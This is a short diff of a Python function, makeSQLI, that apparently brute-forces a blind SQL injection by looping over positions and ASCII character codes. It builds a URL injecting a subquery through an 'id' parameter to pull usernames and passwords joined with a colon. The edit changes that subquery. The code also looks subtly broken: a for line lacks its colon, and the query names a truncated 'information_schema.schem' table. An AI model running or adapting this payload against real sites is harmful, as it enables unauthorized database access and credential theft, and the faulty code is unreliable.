@@ -72,5 +72,5 @@ def makeSQLI():
 
 	for position in range(1, 200)
 		for character in range(33, 126):
-			sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password))))))"
+			sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password)from information_schema.schem)))))"
 ```
